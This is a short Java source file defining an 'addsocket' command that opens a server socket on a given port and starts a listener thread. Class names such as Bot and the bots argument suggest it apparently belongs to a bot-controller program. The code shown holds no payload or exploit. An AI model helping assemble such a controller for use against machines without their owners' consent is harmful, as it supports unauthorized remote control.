package com.redpois0n.commands;

import java.net.ServerSocket;

import com.redpois0n.bot.Bot;
import com.redpois0n.bot.Main;
import com.redpois0n.bot.ThreadServer;
import com.redpois0n.exceptions.IllegalArgumentLengthException;


public class CommandAddSocket extends Command {

	/**
	 * Adds server socket and begins to listen
	 */
	@Override
	public void execute(String[] args, Bot[] bots) throws Exception {
		if (args.length != 1) {
			throw new IllegalArgumentLengthException();
		}
		
		int port = Integer.parseInt(args[0]);
		
		ServerSocket socket = new ServerSocket(port);
		new Thread(new ThreadServer(socket), "Socket " + port).start();
		Main.sockets.put(port, socket);
		
		Main.log("Socket added");
	}

	@Override
	public String getUsage() {
		return "addsocket [PORT]";
	}

	@Override
	public String getExample() {
		return "addsocket 2013";
	}

	@Override
	public String getDescription() {
		return "Starts listen to port";
	}

}
